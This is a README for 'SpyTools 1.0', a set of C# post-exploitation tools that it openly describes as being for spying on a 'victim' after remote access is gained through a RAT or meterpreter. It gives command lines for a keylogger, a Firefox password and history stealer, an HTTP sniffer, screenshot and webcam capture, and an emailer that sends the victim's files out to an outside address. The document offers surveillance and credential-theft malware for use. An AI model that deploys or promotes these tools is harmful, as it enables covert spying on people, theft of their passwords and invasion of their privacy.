# SpyTools 1.0
SpyTools is a collection of little tools wirtten in C# .Net 2.0, usefull to spy a vectim. If you got remote access, with a RAT or meterpreter, you can upload this tools to the victim machine, and run them, or persist them using Porwersploit. It is distributed under the GNU GPLv3 license.
## List of tools
### EmailSender
Get all files with some extensions in the current path, and send an email attaching them.
```
EmailSender.exe "server.com" "user@server.com" "password" "from@domain.com" "FromName" "to@domain.com" "Subject" "Body" "jpg,txt,png"
```
### FoxyStealer
Copy to the current path, all firefox database and conifg files, for each profile. You can get the history or the passwords saved form them.
```
FoxyStealer.exe
```
### HTTPSniffer
Start to capture all HTTP traffic, and flush them into a txt file.
```
HTTPSniffer.exe ["OutputFileName"] [NumericIntervalToFlushTrafficToDisk]
```
### Keylogger
Start to capture all keys, and flush them into a file.
```
Keylogger.exe ["OutputFileName"] [NumericIntervalToFlushKeysToDisk]
```
### Printscreen
Take a screenshot.
```
Printscreen.exe ["OutputFileName"]
```
### WebcamSnap
Take a picture from the webcam.
```
WebcamSnap.exe ["OutputFileName"]
```
